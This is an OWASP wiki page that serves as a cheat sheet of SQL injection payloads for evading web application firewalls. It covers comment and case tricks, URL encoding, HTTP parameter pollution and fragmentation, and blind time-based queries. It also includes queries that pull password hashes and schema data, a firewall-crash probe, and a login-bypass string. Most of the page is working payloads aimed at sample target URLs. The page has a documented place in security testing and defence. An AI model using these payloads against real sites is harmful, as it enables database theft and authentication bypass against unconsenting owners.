---

title: SQL Injection Bypassing WAF
layout: col-sidebar
author:
contributors:
auto-migrated: 1
permalink: /attacks/SQL_Injection_Bypassing_WAF

---

{% include writers.html %}

## SQLi

A [SQL injection](SQL_injection) attack consists of insertion
or "injection" of a SQL query via the input data from the client to the
application. A successful SQL injection exploit can read sensitive data
from the database, modify database data (Insert/Update/Delete), execute
administration operations on the database (such as shutdown the DBMS),
recover the content of a given file present on the DBMS file system and
in some cases issue commands to the operating system. SQL injection
attacks are a type of [injection
attack](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection), in which SQL commands
are injected into data-plane input in order to effect the execution of
predefined SQL commands.

## SQL Injection – Basic Concepts

There are two types of SQL Injection

    • SQL Injection into a String/Char parameter
      Example: SELECT * from table where example = 'Example'

    • SQL Injection into a Numeric parameter
      Example: SELECT * from table where id = 123

1.  Exploitation of SQL Injection vulnerabilities is divided into
    classes according to the DBMS type and injection conditions.

<!-- end list -->

    • A vulnerable request can get into Insert, Update, Delete, etc.
      Example: UPDATE users SET pass = '1' where user = 't1' OR 1=1--'

1.  Blind SQL Injection

<!-- end list -->

```
 Example: select * from table where id = 1 AND if((ascii(lower(substring((select user()),$i,1))))!=$s,1,benchmark(200000,md5(now())))
```

    SLEEP(5)--
    SELECT BENCHMARK(1000000,MD5('A'));
    id=1 OR SLEEP(25)=0 LIMIT 1--
    id=1) OR SLEEP(25)=0 LIMIT 1--
    id=1' OR SLEEP(25)=0 LIMIT 1--
    id=1') OR SLEEP(25)=0 LIMIT 1--
    id=1)) OR SLEEP(25)=0 LIMIT 1--
    id=SELECT SLEEP(25)--

1.  Exploitation features for various DBMSs

<!-- end list -->

```
  Example: (MySQL): SELECT * from table where id = 1 union select 1,2,3
  Example: (PostgreSQL): SELECT * from table where id = 1; select 1,2,3
```

**Bypassing WAF: SQL Injection - Normalization Method**
Example Number (1) of a vulnerability in the function of request
Normalization.
• The following request doesn’t allow anyone to conduct an attack

` /?id=1+union+select+1,2,3/*`

• If there is a corresponding vulnerability in the WAF, this request

` will be successfully performed`
` /?id=1/*union*/union/*select*/select+1,2,3/*`

• After being processed by WAF, the request will become

` index.php?id=1/*uni X on*/union/*sel X ect*/select+1,2,3/*`

The given example works in case of cleaning of dangerous traffic, not in
case of blocking the entire request or the attack source.
Example Number (2) of a vulnerability in the function of request
Normalization.
• Similarly, the following request doesn’t allow anyone to conduct an
attack

` /?id=1+union+select+1,2,3/*`

• If there is a corresponding vulnerability in the WAF, this request
will be successfully performed

` /?id=1+un/**/ion+sel/**/ect+1,2,3--`

• The SQL request will become

` SELECT * from table where id =1 union select 1,2,3--`

*Instead of construction /\*\*/, any symbol sequence that WAF cuts off
can be used (e.g., \#\#\#\#\#, %00).*

*The given example works in case of excessive cleaning of incoming data
(replacement of a regular expression with the empty string).*

**'Using HTTP Parameter Pollution (HPP)**'

• The following request doesn’t allow anyone to conduct an attack

` /?id=1;select+1,2,3+from+users+where+id=1--`

• This request will be successfully performed using HPP

` /?id=1;select+1&id=2,3+from+users+where+id=1--`

*Successful conduction of an HPP attack bypassing WAF depends on the
environment of the application being attacked.* [EU09 Luca Carettoni, Stefano diPaola](http://wiki.owasp.org/images/b/ba/AppsecEU09_CarettoniDiPaola_v0.8.pdf)

![SQL Injection using HTTP Parameter Pollution](../assets/images/attacks/sql-injection-HPP.png)

**Using HTTP Parameter Pollution (HPP)**

• Vulnerable code

` SQL=" select key from table where id= "+Request.QueryString("id")`

• This request is successfully performed using the HPP technique

` /?id=1/**/union/*&id=*/select/*&id=*/pwd/*&id=*/from/*&id=*/users`

• The SQL request becomes select key from table where

` id=1/**/union/*,*/select/*,*/pwd/*,*/from/*,*/users`

**ByPassing WAF: SQL Injection – HPF**
Using HTTP Parameter Fragmentation (HPF)

• Vulnerable code example

` Query("select * from table where a=".$_GET['a']." and b=".$_GET['b']);`
` Query("select * from table where a=".$_GET['a']." and b=".$_GET['b']." limit".$_GET['c']);`

• The following request doesn’t allow anyone to conduct an attack

` /?a=1+union+select+1,2/*`

• These requests may be successfully performed using HPF

` /?a=1+union/*&b=*/select+1,2`
` /?a=1+union/*&b=*/select+1,pass/*&c=*/from+users--`

• The SQL requests become

` select * from table where a=1 union/* and b=*/select 1,2`
` select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users--`

**Bypassing WAF: Blind SQL Injection**
Using logical requests AND/OR
• The following requests allow one to conduct a successful attack for
many WAFs

` /?id=1+OR+0x50=0x50`
` /?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74`

<i>Negation and inequality signs (\!=, \<\>, \<, \>) can be used instead
of the equality one – It is amazing, but many WAFs miss it\!</i>

It becomes possible to exploit the vulnerability with the method of
blind-SQL Injection by replacing SQL functions that get to WAF
signatures with their synonyms.
<i> substring() -\> mid(), substr()
ascii() -\> hex(), bin()
benchmark() -\> sleep() </i>
<u>Wide variety of logical requests.</u>
and 1
or 1
and 1=1
and 2\<3
and 'a'='a'
and 'a'\<\>'b'
and char(32)=' '
and 3\<=2
and 5\<=\>4
and 5\<=\>5
and 5 is null
or 5 is not null
....
<b>An example of various request notations with the same meaning.</b>
select user from mysql.user where user = 'user' OR
mid(password,1,1)='\*'
select user from mysql.user where user = 'user' OR
mid(password,1,1)=0x2a
select user from mysql.user where user = 'user' OR
mid(password,1,1)=unhex('2a')
select user from mysql.user where user = 'user' OR mid(password,1,1)
regexp '\[\*\]'
select user from mysql.user where user = 'user' OR mid(password,1,1)
like '\*'
select user from mysql.user where user = 'user' OR mid(password,1,1)
rlike '\[\*\]'
select user from mysql.user where user = 'user' OR
ord(mid(password,1,1))=42
select user from mysql.user where user = 'user' OR
ascii(mid(password,1,1))=42
select user from mysql.user where user = 'user' OR
find_in_set('2a',hex(mid(password,1,1)))=1
select user from mysql.user where user = 'user' OR position(0x2a in
password)=1
select user from mysql.user where user = 'user' OR
locate(0x2a,password)=1
<b>Known:
</b> substring((select 'password'),1,1) = 0x70
substr((select 'password'),1,1) = 0x70
mid((select 'password'),1,1) = 0x70
<b>New:</b>
strcmp(left('password',1), 0x69) = 1
strcmp(left('password',1), 0x70) = 0
strcmp(left('password',1), 0x71) = -1
STRCMP(expr1,expr2) returns 0 if the strings are the same, -1 if the
first , argument is smaller than the second one, and 1 otherwise.

<b>An example of signature bypass.</b>
The following request gets to WAF signature
/?id=1+union+(select+1,2+from+users) But sometimes, the signatures used
can be bypassed
/?id=1+union+(select+'xz'from+xxx)

`/?id=(1)union(select(1),mid(hash,1,32)from(users))`
`/?id=1+union+(select'1',concat(login,hash)from+users)`
`/?id=(1)union(((((((select(1),hex(hash)from(users))))))))`
`/?id=(1)or(0x50=0x50)`


<b>An SQL Injection attack can successfully bypass the WAF , and be
conducted in all following cases:</b>
• Vulnerabilities in the functions of WAF request normalization.
• Application of HPP and HPF techniques.
• Bypassing filter rules (signatures).
• Vulnerability exploitation by the method of blind SQL Injection.
• Attacking the application operating logics (and/or)

<b>WAF Bypassing Strings.</b>

` /*!%55NiOn*/ /*!%53eLEct*/`
`  %55nion(%53elect 1,2,3)-- -`
`  +union+distinct+select+`
`  +union+distinctROW+select+`
`  /**//*!12345UNION SELECT*//**/`
`  concat(0x223e,@@version)`
`  concat(0x273e27,version(),0x3c212d2d)`
`  concat(0x223e3c62723e,version(),0x3c696d67207372633d22)`
`  concat(0x223e,@@version,0x3c696d67207372633d22)`
`  concat(0x223e,0x3c62723e3c62723e3c62723e,@@version,0x3c696d67207372633d22,0x3c62​723e)`
`  concat(0x223e3c62723e,@@version,0x3a,”BlackRose”,0x3c696d67207372633d22)`
`  concat(‘’,@@version,’’)`
`  /**//*!50000UNION SELECT*//**/`
`  /**/UNION/**//*!50000SELECT*//**/`
`  /*!50000UniON SeLeCt*/`
`  union /*!50000%53elect*/`
`  +#uNiOn+#sEleCt`
`  +#1q%0AuNiOn all#qa%0A#%0AsEleCt`
`  /*!%55NiOn*/ /*!%53eLEct*/`
`  /*!u%6eion*/ /*!se%6cect*/`
`  +un/**/ion+se/**/lect`
`  uni%0bon+se%0blect`
`  %2f**%2funion%2f**%2fselect`
`  union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A`
`  REVERSE(noinu)+REVERSE(tceles)`
`  /*--*/union/*--*/select/*--*/`
`  union (/*!/**/ SeleCT */ 1,2,3)`
`  /*!union*/+/*!select*/`
`  union+/*!select*/`
`  /**/union/**/select/**/`
`  /**/uNIon/**/sEleCt/**/`
`  /**//*!union*//**//*!select*//**/`
`  /*!uNIOn*/ /*!SelECt*/`
`  +union+distinct+select+`
`  +union+distinctROW+select+`
`  +UnIOn%0d%0aSeleCt%0d%0a`
`  UNION/*&test=1*/SELECT/*&pwn=2*/`
`  un?+un/**/ion+se/**/lect+`
`  +UNunionION+SEselectLECT+`
`  +uni%0bon+se%0blect+`
`  %252f%252a*/union%252f%252a /select%252f%252a*/`
`  /%2A%2A/union/%2A%2A/select/%2A%2A/`
`  %2f**%2funion%2f**%2fselect%2f**%2f`
`  union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A`
`  /*!UnIoN*/SeLecT+`

**Union Select by PASS with Url Encoded Method:**
%55nion(%53elect)
union%20distinct%20select
union%20%64istinctRO%57%20select
union%2053elect
%23?%0auion%20?%23?%0aselect
%23?zen?%0Aunion all%23zen%0A%23Zen%0Aselect
%55nion %53eLEct
u%6eion se%6cect
unio%6e %73elect
unio%6e%20%64istinc%74%20%73elect
uni%6fn distinct%52OW s%65lect
%75%6e%6f%69%6e %61%6c%6c %73%65%6c%65%63%7
**Illegal mix of Collations ByPass Method :**
unhex(hex(Concat(Column_Name,0x3e,Table_schema,0x3e,table_Name)))

`   /*!from*/information_schema.columns/*!where*/column_name%20/*!like*/char(37,%20112,%2097,%20115,%20115,%2037)`

`   union select 1,2,unhex(hex(Concat(Column_Name,0x3e,Table_schema,0x3e,table_Name))),4,5 /*!from*/information_schema.columns/*!where*/column_name%20/*!like*/char(37,%20112,%2097,%20115,%20115,%2037)?`



## Bypass with Comments

SQL comments allow us to bypass a lot of filtering and WAFs.

```
 Code :
 http://victim.com/news.php?id=1+un/**/ion+se/**/lect+1,2,3--

```

## Case Changing

Some WAFs filter only lowercase SQL keyword.

Regex Filter: /union\\sselect/g

    http://victim.com/news.php?id=1+UnIoN/**/SeLecT/**/1,2,3--

## Replaced Keywords

Some application and WAFs use preg_replace to remove all SQL keyword.
So we can bypass easily.

    http://victim.com/news.php?id=1+UNunionION+SEselectLECT+1,2,3--

Some case SQL keyword was filtered out and replaced with whitespace. So
we can use "%0b" to bypass.

    http://victim.com/news.php?id=1+uni%0bon+se%0blect+1,2,3--

For Mod_rewrite, Comments "/\*\*/" cannot bypassed. So we use "%0b"
replace "/\*\*/".

    Forbidden: http://victim.com/main/news/id/1/**/
    |
    |/**/lpad(first_name,7,1).html
    Bypassed : http://victim.com/main/news/id/1%0b
    |
    |%0blpad(first_name,7,1).html

## Advanced Methods

Crash Firewall via doing Buffer Over Flow.

1\) Buffer Overflow / Firewall Crash: Many Firewalls are developed in
C/C++ and we can Crash them using Buffer Overflow.

```
    http://www.site.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 “A”)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4….

    You can test if the WAF can be crashed by typing:
    ?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4….

    If you get a 500, you can exploit it using the Buffer Overflow Method.
```

2\) Replace Characters with their HEX Values: We can replace some
characters with their HEX (URL-Encoded) Values.

    Example:
        http://www.site.com/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4….
        (which means “union select”)

4\) Misc Exploitable Functions: Many firewalls try to offer more
Protection by adding Prototype or Strange Functions\! (Which, of course,
we can exploit\!):

    Example:
        This firewall below replaces “*” (asterisks) with Whitespaces! What we can do is this:
        http://www.site.com/index.php?page_id=-15+uni*on+sel*ect+1,2,3,4…
        (If the Firewall removes the “*”, the result will be: 15+union+select….)
        So, if you find such a silly function, you can exploit it, in this way.

## Auth Bypass

If we need to bypass some admin panels, and we do that using or 1=1.

    Code:
    or 1-- -' or 1 or '1"or 1 or"

SELECT \* FROM login WHERE id=1 or 1-- -' or 1 or '1"or 1 or" AND
username='' AND password='' the "or 1-- -" gets active, make the
condition true and ignores the rest of the query. now lets check regular
string-

SELECT \* FROM login WHERE username=' or 1-- -' or 1 or '1"or 1 or" '
..... the "or 1" part make the query true, and the other parts are
considered as the comparison strings. same with the double quotes.
SELECT \* FROM login WHERE username=" or 1-- -' or 1 or '1"or 1 or" "

## Benchmark

Please use *' Benchmark*' and make you own SQLi Strings and test your
different test cases on
[Benchmark](https://www.owasp.org/index.php/Benchmark)

<hr>

*If you have any SQLi Quires which is Missed above Please help to
Contribute [Mail Down](https://www.owasp.org/index.php/Dhiraj_Mishra)
and be a part of **The Popular SQLi Evasion CheatSheet.***

## Contributor

Dhiraj Mishra (mishra.dhiraj@owasp.org)
